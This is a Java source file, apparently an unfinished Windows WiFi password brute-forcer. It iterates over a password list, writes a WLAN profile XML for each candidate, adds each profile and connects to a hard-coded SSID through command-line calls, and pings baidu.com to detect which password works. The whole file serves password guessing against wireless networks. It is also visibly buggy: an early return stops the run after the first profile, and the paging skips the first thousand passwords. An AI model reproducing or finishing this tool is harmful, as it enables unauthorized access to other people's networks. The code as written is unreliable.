package com.alialiso.wifi;

import java.util.ArrayList;
import java.util.Collections;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.logging.Logger;
import java.util.List;

public class WindowsApp {

    private static Logger logger = Logger.getLogger("AppMain");

    public static String wifiName = "609";//wifi名称
    public static Integer threadNum = 4;//线程数
    public static Long speed = 100L;//执行速度
    public static Long fileNo = 0L;

    public static final String APP_DIR = System.getProperty("user.dir");//app地址
    private ExecutorService executorService = Executors.newFixedThreadPool(threadNum);//多线程执行任务

    //入口
    public static void main(String[] args) {
        //开启应用页面 并获取wifi列表
        List<String> wifis_result = CMDUtil.execute(CMDUtil.GET_WIFI_LIST, null);
        if (wifis_result != null && wifis_result.size() > 0) {
            System.out.println(wifis_result.toString());
        }
        //获取用户输入 wifi名称 线程数 执行速率

        //每次读取密码一千个密码
        long t1 = System.currentTimeMillis();
        //遍历密码，生成请求xml，发起cmd请求
        boolean next = true;
        int pageSize = 1;
        while(next){
            List<String> passwords = FileUtils.readLine(APP_DIR+"/password.txt", pageSize * 1000, (pageSize + 1) * 1000 - 1);
            pageSize++;
            if (passwords != null && passwords.size() != 0){
                for (String password : passwords) {
                    String profileContent = Profile.PROFILE.replace(Profile.WIFI_NAME, wifiName);
                    profileContent = profileContent.replace(Profile.WIFI_PASSWORD, password);
                    System.out.println(APP_DIR);
                    FileUtils.writeToFile(APP_DIR + "/" + (++fileNo) + ".xml", profileContent);
                    System.out.println(profileContent);
                    //生成接口文件
                    return;
                }
            }else{
                next = false;
            }
        }
        int trueCount = 0;
        outer:
        for (int i = 1; i <= fileNo; i++) {
            //加载配置文件
            String add_cmd = CMDUtil.ADD_PROFILE.replace("FILE_NAME", i + ".xml");
            List<String> add_result = CMDUtil.execute(add_cmd, APP_DIR);
            if (add_result != null && add_result.size() > 0) {
                if (add_result.get(0).contains("添加到接口")) {
                    //连接wifi
                    String connect_cmd = CMDUtil.CONNECT.replace("SSID_NAME", wifiName);
                    List<String> result = CMDUtil.execute(connect_cmd, null);
                    if (result != null && result.size() > 0) {
                        if (result.get(0).contains("已成功完成")) {
                            //ping下结果
                            String ping_cmd = "ping www.baidu.com";
                            List<String> ping_result = CMDUtil.execute(ping_cmd, null);
                            if (ping_result != null && ping_result.size() > 0) {
                                for (String item : ping_result) {
                                    if (item.contains("来自")) {
                                        System.out.println("密码是第"+i+"条");
                                        break outer;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        System.out.println(trueCount+"<<<<<<<<<<<<<<<<<<");
        //读取配置文件，发起命令执行
        long t2 = System.currentTimeMillis();

        logger.info("用时："+ (t2 - t1));
    }

    //获取wifi列表
    public static List<String> getWifiList(){
        List<String> wifiNameList = new ArrayList<>();
        //TODO
        return wifiNameList;
    }

}
